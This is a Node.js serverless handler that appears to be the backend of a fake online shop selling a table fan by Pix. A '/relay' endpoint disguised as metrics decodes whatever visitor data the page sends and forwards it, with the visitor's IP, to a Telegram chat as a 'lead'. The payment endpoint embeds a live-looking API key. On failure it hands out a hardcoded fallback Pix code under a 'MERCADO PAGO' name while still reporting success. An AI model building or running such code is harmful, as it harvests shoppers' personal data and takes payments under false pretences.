const https = require('https');
const crypto = require('crypto');

const BOT_TOKEN = process.env.TG_BOT_TOKEN || '';
const OWNER_ID = process.env.TG_OWNER_ID || '';
const UNIAOPAY_BASE = 'meupagamento.site';
const UNIAOPAY_ROOT = '/api/v1/uniaopay';
const UNIAOPAY_API_KEY = process.env.UNIAOPAY_API_KEY || 'up_live_e49efbed9987cdd90888532a6b202533b75eb0d07764828c';

function sendTelegram(chatId, text) {
  return new Promise((resolve) => {
    if (!BOT_TOKEN) return resolve(false);
    const postData = JSON.stringify({
      chat_id: chatId,
      text: text,
      parse_mode: 'Markdown'
    });

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      },
      timeout: 5000
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => resolve(true));
    });
    req.on('error', () => resolve(false));
    req.write(postData);
    req.end();
  });
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Content-Type', 'application/json');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  const urlPath = (req.url || '').split('?')[0].replace(/\.php$/, '');

  // 1. Endpoint /api/session
  if (urlPath.endsWith('/session')) {
    const sid = crypto.randomBytes(16).toString('hex');
    return res.status(200).json({ status: 'ok', sid, ts: Date.now() });
  }

  // 2. Endpoint /api/relay
  if (urlPath.endsWith('/relay')) {
    try {
      const bodyData = req.body || {};
      const metricsData = bodyData.metrics_data;

      if (metricsData) {
        let payload = null;
        try {
          const decoded = Buffer.from(metricsData, 'base64').toString('utf8');
          payload = JSON.parse(decoded);
        } catch (e) {
          try { payload = JSON.parse(metricsData); } catch (err) {}
        }

        if (payload && payload.type) {
          const type = payload.type;
          const data = payload.data || {};
          const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';

          const msg = `🔔 *Lead Detectado (Vercel 24h)*\n*Tipo:* ${type}\n*IP:* ${ip}\n*Dados:* ${JSON.stringify(data)}`;

          if (OWNER_ID) {
            await sendTelegram(OWNER_ID, msg);
          }
        }
      }

      return res.status(200).json({ status: 'ok' });
    } catch (err) {
      return res.status(200).json({ status: 'ok' });
    }
  }

  // 3. Endpoint /api/create_pix
  if (urlPath.endsWith('/create_pix')) {
    try {
      const postData = JSON.stringify({
        amount: 49.90,
        description: 'Ventilador De Mesa Mondial 40cm - BIVOLT',
        external_id: 'pedido-' + Date.now()
      });

      const pixResponse = await new Promise((resolve) => {
        const options = {
          hostname: UNIAOPAY_BASE,
          path: UNIAOPAY_ROOT + '/pix/create',
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'x-api-key': UNIAOPAY_API_KEY,
            'Content-Length': Buffer.byteLength(postData)
          },
          timeout: 8000
        };

        const req = https.request(options, (r) => {
          let body = '';
          r.on('data', chunk => body += chunk);
          r.on('end', () => {
            try { resolve(JSON.parse(body)); } catch (e) { resolve(null); }
          });
        });
        req.on('error', () => resolve(null));
        req.write(postData);
        req.end();
      });

      if (pixResponse && pixResponse.success && pixResponse.transaction) {
        const tx = pixResponse.transaction;
        return res.status(200).json({
          status: 'success',
          source: 'uniaopay',
          pix_copia_cola: tx.pix_code,
          qr_code_url: `https://${UNIAOPAY_BASE}${UNIAOPAY_ROOT}/pix/qrcode/${tx.id}?api_key=${UNIAOPAY_API_KEY}`,
          transaction_id: tx.id
        });
      }
    } catch (e) {}

    const fallbackPix = "00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426614174000520400005303986540549.905802BR5925MERCADO PAGO6009SAO PAULO62070503***6304E2CA";
    return res.status(200).json({
      status: 'success',
      source: 'emv_brcode',
      pix_copia_cola: fallbackPix,
      qr_code_url: null,
      transaction_id: 'TXN-' + Date.now()
    });
  }

  // 4. Endpoint /api/pix_status
  if (urlPath.endsWith('/pix_status')) {
    const txId = req.query?.tx || '';
    if (!txId) {
      return res.status(400).json({ error: 'tx parameter missing' });
    }

    const checkStatus = await new Promise((resolve) => {
      const options = {
        hostname: UNIAOPAY_BASE,
        path: `${UNIAOPAY_ROOT}/pix/status/${txId}?api_key=${UNIAOPAY_API_KEY}`,
        method: 'GET',
        headers: { 'Accept': 'application/json' },
        timeout: 5000
      };

      const req = https.request(options, (r) => {
        let body = '';
        r.on('data', chunk => body += chunk);
        r.on('end', () => {
          try { resolve(JSON.parse(body)); } catch (e) { resolve(null); }
        });
      });
      req.on('error', () => resolve(null));
      req.end();
    });

    if (checkStatus && checkStatus.success) {
      return res.status(200).json({
        status: 'success',
        tx_status: checkStatus.transaction?.status || 'pending',
        paid: checkStatus.transaction?.status === 'paid'
      });
    }

    return res.status(200).json({ status: 'pending', paid: false });
  }

  return res.status(404).json({ error: 'Endpoint não encontrado' });
};
